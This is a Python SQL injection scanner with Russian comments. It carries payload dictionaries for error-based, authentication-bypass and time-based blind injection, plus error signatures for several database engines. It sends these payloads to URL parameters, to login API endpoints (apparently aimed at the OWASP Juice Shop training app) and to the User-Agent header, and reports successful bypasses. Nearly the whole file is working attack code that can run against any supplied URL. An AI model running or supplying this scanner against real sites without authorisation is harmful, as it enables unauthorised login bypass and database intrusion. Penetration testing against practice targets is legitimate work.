import requests
import time
import logging

# 1. СЛОВАРИ АТАКИ
PAYLOADS = {
    # Классические (Error-based / Boolean-based)
    "Generic": ["'", "\"", "' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", "' UNION SELECT NULL,NULL --"],
    # Обход авторизации
    "Auth": ["admin' --", "admin' #", "' OR '1'='1' --", "admin'/*"],
    # Слепые (Time-based) - задержка 3 секунды
    "Time": ["' WAITFOR DELAY '0:0:3' --", "'; SELECT SLEEP(3) --", "' OR pg_sleep(3) --", "'; sleep(3) --"]
}

# Сигнатуры ошибок разных БД
DBMS_ERRORS = {
    "MySQL": ["SQL syntax", "mysql_fetch", "check the manual that corresponds to your MySQL"],
    "PostgreSQL": ["PostgreSQL query failed", "unterminated quoted string", "syntax error at or near"],
    "Oracle": ["ORA-01756", "ORA-00936", "SQL command not properly ended"],
    "SQL Server": ["Unclosed quotation mark", "SQL Server", "ODBC SQL Server Driver"],
    "SQLite": ["SQLite Error", "sqlite3.OperationalError", "near \"'\": syntax error"]
}

def check_response(response, start_time=None):
    """Анализ ответа на наличие ошибок или задержек"""
    text = response.text.lower()
    
    # 1. Error-based check
    for db, errors in DBMS_ERRORS.items():
        for err in errors:
            if err.lower() in text:
                return f"Error-based ({db})"
    
    # 2. Time-based check (если был передан start_time)
    if start_time:
        elapsed = time.time() - start_time
        if elapsed > 3: # Если ответ шел дольше 3 сек
            return "Time-based (Blind SQLi)"
            
    return None

def scan_sql_injection(url: str) -> bool:
    """
    Мощный сканер SQLi: GET, POST (JSON/Form), Headers
    """
    print(f"🔍 SQLi scan: {url}")
    target_url = url.split('?')[0] # Чистый URL
    vulnerable = False

    # 1. GET Parameters Scan
    if '?' in url:
        for p_type, payloads in PAYLOADS.items():
            for payload in payloads:
                # Вставляем payload в конец URL
                test_url = f"{url}{payload}"
                try:
                    start = time.time()
                    r = requests.get(test_url, timeout=5) # 5 сек таймаут
                    res = check_response(r, start if "Time" in p_type else None)
                    if res:
                        print(f"  🔴 HIT: {res} via GET payload '{payload}'")
                        vulnerable = True
                        break # Нашли одну - хватит мучить параметр
                except: pass
            if vulnerable: break

    # 2. JSON API Scan (POST) - Для Juice Shop!
    # Эвристика: пробуем путь /api/Users/, /rest/user/login и т.д.
    api_endpoints = [
        f"{target_url.rstrip('/')}/rest/user/login", # Juice Shop
        f"{target_url.rstrip('/')}/api/login",
        f"{target_url.rstrip('/')}/login"
    ]
    
    for api in api_endpoints:
        if vulnerable: break
        for payload in PAYLOADS["Auth"] + PAYLOADS["Generic"]:
            # Пробуем JSON
            json_data = {"email": payload, "password": "password", "username": payload}
            try:
                r = requests.post(api, json=json_data, timeout=5)
                
                # Специфика Juice Shop: успешный логин возвращает токен или JSON с ID
                if r.status_code == 200 and ("token" in r.text or "authentication" in r.text):
                    print(f"  🔴 HIT: Auth Bypass (JSON) at {api} with '{payload}'")
                    vulnerable = True
                    break
                
                # Ошибки 500 тоже интересны
                res = check_response(r)
                if res:
                    print(f"  🔴 HIT: {res} in JSON API at {api}")
                    vulnerable = True
                    break
            except: pass

    # 3. User-Agent Injection (Бонус)
    if not vulnerable:
        ua_payload = "' OR '1'='1"
        try:
            r = requests.get(url, headers={"User-Agent": ua_payload}, timeout=5)
            if check_response(r):
                print(f"  🔴 HIT: SQLi in User-Agent header")
                vulnerable = True
        except: pass

    if vulnerable:
        print("🟡 SQL Injection vulnerabilities found!")
        return True
    
    print("🟢 SQL Injection clean")
    return False
